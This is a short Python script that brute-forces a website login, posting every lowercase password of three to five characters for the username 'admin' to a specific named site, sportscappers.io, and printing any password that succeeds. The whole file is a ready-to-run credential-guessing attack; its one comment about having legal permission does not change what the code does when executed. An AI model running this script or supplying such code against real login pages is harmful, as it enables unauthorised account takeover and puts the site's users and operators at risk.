import requests
import itertools
import string
import time

def try_login(url, username, password):
    payload = {'username': username, 'password': password}
    response = requests.post(url, data=payload)
    return "Login successful" in response.text  # Adjust based on your website's response

def brute_force_attack(url, username, max_length, charset=string.ascii_lowercase):
    for length in range(3, max_length + 1):  # Start from length 3
        for guess in itertools.product(charset, repeat=length):
            guess_password = ''.join(guess)
            print(f"Trying: {guess_password}")  # Display the attempted password
            if try_login(url, username, guess_password):
                
                return guess_password
            time.sleep(1)  # Pause for 1 second between each request
    return None

# Example usage:
# Ensure to replace the URL and username with your actual testing data
# and ensure you have the legal right and permission to test the system.
login_url = "https://sportscappers.io/"  # Replace with your actual login URL
username_to_try = "admin"  # Replace with the username you're trying to login with

guessed_password = brute_force_attack(login_url, username_to_try, max_length=5)

if guessed_password:
    print(f"\nPassword has been guessed: {guessed_password}")
else:
    print("\nFailed to guess the password.")
